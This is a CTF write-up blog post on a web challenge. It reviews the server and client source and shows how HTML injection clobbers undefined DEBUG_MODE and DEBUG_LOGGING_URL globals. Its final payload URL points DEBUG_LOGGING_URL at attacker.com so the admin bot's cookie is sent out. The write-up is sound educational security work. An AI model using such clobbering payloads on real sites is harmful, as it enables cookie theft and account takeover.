---
layout: post
title: Dom Clobbering to Overwrite Undefined variable or Objects!
subtitle: Dom Clobbering | Host Header
cover-img: /assets/img/wsc.jpg
thumbnail-img: /assets/img/thumb.png
share-img: /assets/img/wsc.jpg
tags: [Web]
---

# Don't Only Mash... Clobber!

<br>

<img src="https://i.imgur.com/U5scICW.png">

<br>
Chal Description: 

```
Submit an image link to our "evaluator" and steal their cookie!
```

Another XSS Chal at First sight, But The Chal Name says  `Clobber!`

## Website:

<br>

<img src="https://i.imgur.com/DIsF6wR.png">

## Functionalities

There are Two Functionalities.

* Submit the url to View any Image in the Internet.(Client Side Rendering)
* Submit a Picture Url To Admin Bot. So, The admin Bot also view the Image with Cookies.

---
<br>

## Source Code Review:

>## server.js

```js
const express = require('express')
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer')
const escape = require('escape-html')

const app = express()
const port = 9000

app.use(express.static(__dirname + '/webapp'))
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/personalize', (req, res) => {
    const imageUrl = req.query.image
    if (typeof imageUrl !== 'string' || !imageUrl) {
        res.send("'image' query parameter needs to be a string")
        return
    }

    try {
        var newUrl = new URL(imageUrl)
        console.log(newUrl)
    }
    catch (e) {
        res.send(escape(e.message))
        return
    }

    const pageContent =
    `
        <html>
        <head>
            <script src="/app.js"></script>
        </head>
        <body id="body">
            <p>Here is the image you submitted:</p>
            <img id="user-image" src="${newUrl}">
            <br/>
            <br/>
            <p>You submitted this url: <span id="user-image-info"></span></p>
        </body>
        </html>
    `

    // The intended solution does not involve bypassing CSP and gaining XSS.
    // If you can do so anyway, go for it! :)
    res.set("Content-Security-Policy", "default-src 'self'; img-src *; object-src 'none';")
    res.setHeader('Content-Type', "text/html")
    res.send(pageContent)
})

const visitUrl = async (url, cookieDomain) => {
    // Chrome generates this error inside our docker container when starting up.
    // However, it seems to run ok anyway.
    //
    // [0105/011035.292928:ERROR:gpu_init.cc(457)] Passthrough is not supported, GL is disabled, ANGLE is

    let browser =
            await puppeteer.launch({
                headless: true,
                pipe: true,
                dumpio: true,
                ignoreHTTPSErrors: true,

                // headless chrome in docker is not a picnic
                args: [
                    '--incognito',
                    '--no-sandbox',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-dev-shm-usage',
                ]
            })

    try {
        const ctx = await browser.createIncognitoBrowserContext()
        const page = await ctx.newPage()

        try {
            await page.setCookie({
                name: 'flag',
                value: 'FLAG{PAKE_PLAG}',
                domain: cookieDomain,
                httpOnly: false,
                samesite: 'strict'
            })
            await page.goto(url, { timeout: 6000, waitUntil: 'networkidle2' })
        } finally {
            await page.close()
            await ctx.close()
        }
    }
    finally {
        browser.close()
    }
}

app.post('/visit', async (req, res) => {
    const url = req.body.url
    console.log('received url: ', url)

    let parsedURL
    try {
        parsedURL = new URL(url)
    }
    catch (e) {
        res.send(escape(e.message))
        return
    }

    if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
        res.send('Please provide a URL with the http or https protocol.')
        return
    }

    if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}`)
        return
    }

    try {
        console.log('visiting url: ', url)
        await visitUrl(url, req.hostname)
        res.send('Our evaluator has viewed your image!')
    } catch (e) {
        console.log('error visiting: ', url, ', ', e.message)
        res.send('Error visiting your URL: ' + escape(e.message))
    } finally {
        console.log('done visiting url: ', url)
    }

})

app.listen(port, async () => {
    console.log(`Listening on ${port}`)
})
```

---

## CSP:

```js
    // The intended solution does not involve bypassing CSP and gaining XSS.
    // If you can do so anyway, go for it! :)
    res.set("Content-Security-Policy", "default-src 'self'; img-src *; object-src 'none';")

```

* Default-src: 'self'; img-src: *;object-src: none;
* As Far I know, the Above CSP is Only Able to Bypass when there is a JSONP endpoint in this Site.


## GET Route:

* /personalize
```js
app.get('/personalize', (req, res) => {
    const imageUrl = req.query.image
    if (typeof imageUrl !== 'string' || !imageUrl) {
        res.send("'image' query parameter needs to be a string")
        return
    }
    try {
        var newUrl = new URL(imageUrl)
        console.log(newUrl)
    }
    catch (e) {
        res.send(escape(e.message))
        return
    }

```

* We can Provide a Image Url with `/personalize?image=http://pic.com/pic.png`

* then, Our Pic Url is Passed into a img tag
```html
const pageContent =
    `
        <html>
        <head>
            <script src="/app.js"></script>
        </head>
        <body id="body">
            <p>Here is the image you submitted:</p>
            <img id="user-image" src="${newUrl}">
            <br/>
            <br/>
            <p>You submitted this url: <span id="user-image-info"></span></p>
        </body>
        </html>
    `
res.send(pageContent)

```
## POST Route:

* `/visit`

```js
 app.post('/visit', async (req, res) => {
    const url = req.body.url
    console.log('received url: ', url)

    let parsedURL
    try {
        parsedURL = new URL(url)
    }
    catch (e) {
        res.send(escape(e.message))
        return
    }

```
* Ex Request:
```
POST /visit
Host: ...
...
...
Content-Type: application/x-www-form-urlencoded

url=<url>
```
## Conditions:

```js
if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
        res.send('Please provide a URL with the http or https protocol.')
        return
    }

    if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}`)
        return
    }

```
* parsedUrl is a Object with key and values like Protocol, Host, Hostname, path...

<img src="https://i.imgur.com/KE4b8jl.png">

* Only HTTP and HTTPS Protocols are allowed
* req.hostname is just the Request HOST header value.
* Hostname must equal to the req.hostname
* We cannot Control req.hostname value, Bcoz they Hosted in google Cloud. So, if we Changed the Value, it gives 404


## HTML Injection:

<img src="https://i.imgur.com/gahcR9J.png">

* We Can Perform HTMLi bcoz, Our Input is Not Filtered and Directly passed to the below Mentioned Template.

```html
<html>
        <head>
            <script src="/app.js"></script>
        </head>
        <body id="body">
            <p>Here is the image you submitted:</p>
            <img id="user-image" src="${newUrl}">
            <br/>
            <br/>
            <p>You submitted this url: <span id="user-image-info"></span></p>
        </body>
        </html>

```


## Rabbit Hole:

* Our Goal to Steal the Admin Bot cookie. 
* The Above implementation Gives easy XSS.(without CSP) 

## XSS

<br>

<img src="https://i.imgur.com/RYHURYX.png">

* As I mentioned Above, CSP is Looks Impossible to Bypass. 
* After 5 hrs, I Realized, Bypassing CSP is Rabbit Hole.

## DOM Clobbering:

* The Below Code is Client Side JAVASCRIPT code

>### app.js
```js
window.onload = () => {
    const imgSrc = document.getElementById('user-image').src
    document.getElementById('user-image-info').innerText = imgSrc

    if (DEBUG_MODE) {
        // In debug mode, send the image url to our debug endpoint for logging purposes.
        // We'd normally use fetch() but our CSP won't allow that so use an <img> instead.
        document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
    }
}

```

* This Javascript Loads with we Visit, `/personalize?image=<url>`

<img src="https://i.imgur.com/PMybUaS.png">


## Exploit:

```js
if (DEBUG_MODE) {
        // In debug mode, send the image url to our debug endpoint for logging purposes.
        // We'd normally use fetch() but our CSP won't allow that so use an <img> instead.
        document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
    }
```

* In the Above Code, `DEBUG_MODE` is Not Defined. 

<img src="https://i.imgur.com/jSALZmW.png">

* CSP is Set to defualt-src: 'self'. So, the Javascript files hosted in the server itself only work.

* So, Now we Have HTML injection and a Undedined variable.
* In Order to Exploit this, we need to  Overwrite the Undefined Variable `DEBUG_MODE` and Injecting our own value into `DEBUG_MODE`. 

* By Using  `DEBUG_MODE` as ID, We can create a variable `DEBUG_MODE`.

Payload:
```
https://wsc-2022-web-2-bvel4oasra-uc.a.run.app/personalize?image=https://google.com/"><a id="DEBUG_MODE">

```
<img src="https://i.imgur.com/naI2HH8.png">

* We successfully Defined `DEBUG_MODE`, which is Before Undefined. Now, the Above error says that, `DEBUG_LOGGING_URL` is Undefined. 

* Lets Define that!

Payload:
```
https://wsc-2022-web-2-bvel4oasra-uc.a.run.app/personalize?image=https://google.com/"><a id="DEBUG_MODE"><a id="DEBUG_LOGGING_URL" href="https://attacker.com">
```
* Here, Href is Used to set a value for the 
`DEBUG_LOGGING_URL`.

<img src="https://i.imgur.com/lWnC7G7.png">

* No Errors in Javascript Console!!

* Upon Looking the Network Tab,

<img src="https://i.imgur.com/ZMFYTv4.png">

* A GET Request to Attacker.com with `?auth=&image=(base64(imageURL))`

```js
if (DEBUG_MODE) {
        // In debug mode, send the image url to our debug endpoint for logging purposes.
        // We'd normally use fetch() but our CSP won't allow that so use an <img> instead.
        document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
    }
```
* `?auth` contains base64 Encoded cookie. Now, We dont Have any Cookies, So the The `?auth=` is Empty.

* Flag in the Admin bot cookie. In order to Get the Cookie, Send the about Payload to the Bot to get the Flag

>## flag: wsc{d0m_cl0bb3r1ng_15_fun}
